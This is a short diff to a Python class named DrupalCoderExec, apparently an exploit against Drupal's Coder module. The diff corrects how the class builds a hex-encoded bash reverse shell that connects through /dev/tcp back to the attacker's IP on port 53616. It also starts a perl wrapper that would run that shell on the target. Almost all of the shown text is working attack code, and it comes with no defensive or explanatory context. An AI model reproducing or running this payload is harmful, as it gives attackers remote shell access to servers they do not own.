@@ -29,7 +29,7 @@ class DrupalCoderExec:
         print("DRUPAL: exploit instantiated")
 
 
-        self.hex_rev_shell = binascii.hexlify("bash -c '0<&24-;exec 24<>/dev/tcp/" + local_ip + "/53616;sh <&24 >&24 2>&24'".encode('utf-8')).decode('utf-8')
+        self.hex_rev_shell = binascii.hexlify(("bash -c '0<&24-;exec 24<>/dev/tcp/" + local_ip() + "/53616;sh <&24 >&24 2>&24'").encode('utf-8')).decode('utf-8')
 
         self.rev_shell = (
             "perl -e 'system(pack(qq,H"
